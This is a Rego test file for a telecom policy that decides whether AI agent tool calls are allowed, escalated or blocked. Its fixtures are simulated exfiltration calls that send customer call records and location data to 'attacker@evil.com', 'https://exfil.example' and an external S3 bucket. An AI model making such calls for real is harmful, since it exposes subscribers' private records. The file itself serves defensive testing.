# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors
package norviq.sector.telecom_test

import data.norviq.sector.telecom

test_sim_swap_without_strong_auth_escalates {
    d := telecom.decision with input as {"tool_name": "sim_swap", "tool_params": {"msisdn": "555"}}
    d == "escalate"
    telecom.rule_id == "sim_swap_escalate" with input as {"tool_name": "sim_swap", "tool_params": {}}
}

test_sim_swap_with_strong_auth_allowed {
    d := telecom.decision with input as {"tool_name": "sim_swap", "tool_params": {"msisdn": "555", "strong_auth": true}}
    d == "allow"
}

test_bulk_cpni_read_blocked {
    d := telecom.decision with input as {"tool_name": "list_call_records", "tool_params": {"limit": 1000}}
    d == "block"
    telecom.rule_id == "cpni_bulk_blocked" with input as {"tool_name": "list_call_records", "tool_params": {"limit": 1000}}
}

test_small_cpni_read_allowed {
    d := telecom.decision with input as {"tool_name": "get_cpni", "tool_params": {"limit": 1}}
    d == "allow"
}

test_benign_plan_lookup_allowed {
    d := telecom.decision with input as {"tool_name": "get_plan_details", "tool_params": {"plan": "p1"}}
    d == "allow"
}

# === F-17 regression: CPNI exfil via a renamed export tool (param-semantic, not name-bound) ===

# the flagship repro: renamed export tool carrying CPNI params to an external bucket -> block
test_renamed_export_cpni_exfil_blocked {
    inp := {"tool_name": "export_customer_data", "tool_params": {"call_records": true, "location": true, "destination": "s3://external-bucket"}}
    d := telecom.decision with input as inp
    d == "block"
    telecom.rule_id == "cpni_exfil_blocked" with input as inp
}
# email exfil of CDRs to an external address -> block (@ pattern)
test_email_cdr_exfil_blocked {
    d := telecom.decision with input as {"tool_name": "email_report", "tool_params": {"cdr": true, "to": "attacker@evil.com"}}
    d == "block"
}
# CPNI-named tool pointed at an external URL -> block
test_cpni_named_external_url_blocked {
    d := telecom.decision with input as {"tool_name": "sync_call_records", "tool_params": {"endpoint": "https://exfil.example"}}
    d == "block"
}
# CPNI routed through an egress tool to an INTERNAL store -> escalate (review, not block)
test_cpni_internal_egress_escalates {
    d := telecom.decision with input as {"tool_name": "upload_cpni_archive", "tool_params": {"call_records": true, "destination": "internal-warehouse"}}
    d == "escalate"
    telecom.rule_id == "cpni_egress_review_escalate" with input as {"tool_name": "upload_cpni_archive", "tool_params": {"call_records": true, "destination": "internal-warehouse"}}
}
# benign export with no CPNI -> allow (not over-blocked)
test_benign_export_invoices_allowed {
    d := telecom.decision with input as {"tool_name": "export_invoices", "tool_params": {"amount": 100, "destination": "s3://external"}}
    d == "allow"
}
# small CPNI read still allowed (existing behavior preserved)
test_small_cpni_read_still_allowed {
    d := telecom.decision with input as {"tool_name": "get_cpni", "tool_params": {"limit": 2}}
    d == "allow"
}
